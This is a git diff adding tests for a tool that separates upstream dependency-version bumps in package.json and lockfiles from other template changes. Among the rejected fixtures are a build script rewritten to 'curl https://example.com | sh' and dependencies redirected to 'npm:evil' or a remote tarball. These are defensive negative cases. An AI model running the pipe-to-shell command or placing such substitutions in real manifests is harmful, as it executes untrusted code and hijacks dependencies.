@@ -13,8 +13,10 @@ import {
   isExcluded,
   isIdentical,
   matchesPrefix,
+  onlyDependencyVersionsDiffer,
   parseLsTree,
   previewProblems,
+  splitDependencyUpdates,
 } from './upstream-copy.mjs';
 
 let dir;
@@ -85,6 +87,58 @@ test('a copy that edits, adds, drops or re-modes a file differs', () => {
   assert.deepEqual(diff.added.map((entry) => entry.path), ['package.json']);
   assert.deepEqual(diff.changed.map((entry) => entry.path).sort(), ['bin/run.sh', 'src/index.js']);
   assert.deepEqual(diff.removed.map((entry) => entry.path), ['src/extra.js']);
+  git('reset', '-q', '--hard', 'HEAD~1');
+});
+
+test('dependency updates to the root package.json and lockfile are split from other changes', () => {
+  write('templates/app/package.json', '{"dependencies":{}}\n');
+  write('templates/app/package-lock.json', '{"lockfileVersion":3}\n');
+  write('templates/app/src/index.js', 'export const edited = true;\n');
+  const head = commit('dependabot and an edit');
+
+  const { diff, updated } = splitDependencyUpdates(dir, diffEntries(expectedEntries(dir, upstream, null, ['docs']), actualEntries(dir, head, 'app')));
+  assert.deepEqual(updated.sort(), ['package-lock.json', 'package.json']);
+  assert.deepEqual(diff.changed.map((entry) => entry.path), ['src/index.js']);
+  git('reset', '-q', '--hard', 'HEAD~1');
+});
+
+test('package.json may change only dependency versions and overrides', () => {
+  const upstreamManifest = {
+    name: 'app',
+    scripts: { build: 'astro build' },
+    dependencies: { astro: '^7.4.4' },
+    devDependencies: { vite: '8.3.2' },
+    pnpm: { onlyBuiltDependencies: ['sharp'] },
+  };
+  const bump = (changes) => ({ ...structuredClone(upstreamManifest), ...changes });
+
+  assert.ok(onlyDependencyVersionsDiffer(upstreamManifest, upstreamManifest));
+  assert.ok(onlyDependencyVersionsDiffer(upstreamManifest, bump({ dependencies: { astro: '^7.4.7' }, devDependencies: { vite: '8.3.3' } })));
+  assert.ok(onlyDependencyVersionsDiffer(upstreamManifest, bump({ overrides: { undici: '^8.12.2', vite: { esbuild: '0.25.0' } } })));
+  assert.ok(onlyDependencyVersionsDiffer(upstreamManifest, bump({ pnpm: { onlyBuiltDependencies: ['sharp'], overrides: { devalue: '5.9.3' } } })));
+
+  for (const changed of [
+    bump({ scripts: { build: 'curl https://example.com | sh' } }),
+    bump({ dependencies: { astro: '^7.4.7', extra: '1.0.0' } }),
+    bump({ dependencies: {} }),
+    bump({ dependencies: { astro: 'github:withastro/astro' } }),
+    bump({ dependencies: { astro: 'npm:evil@1.0.0' } }),
+    bump({ overrides: { undici: 'https://example.com/undici.tgz' } }),
+    bump({ pnpm: { onlyBuiltDependencies: ['sharp', 'esbuild'] } }),
+  ]) {
+    assert.equal(onlyDependencyVersionsDiffer(upstreamManifest, changed), false, JSON.stringify(changed));
+  }
+});
+
+test('a package.json that is not valid JSON or a nested lockfile stays a difference', () => {
+  write('templates/app/package.json', '{ not json\n');
+  write('templates/app/src/package-lock.json', '{}\n');
+  const head = commit('broken manifest');
+
+  const { diff, updated } = splitDependencyUpdates(dir, diffEntries(expectedEntries(dir, upstream, null, ['docs']), actualEntries(dir, head, 'app')));
+  assert.deepEqual(updated, []);
+  assert.deepEqual(diff.changed.map((entry) => entry.path), ['package.json']);
+  assert.deepEqual(diff.removed.map((entry) => entry.path), ['src/package-lock.json']);
   git('reset', '-q', '--hard', 'HEAD~1');
 });
 
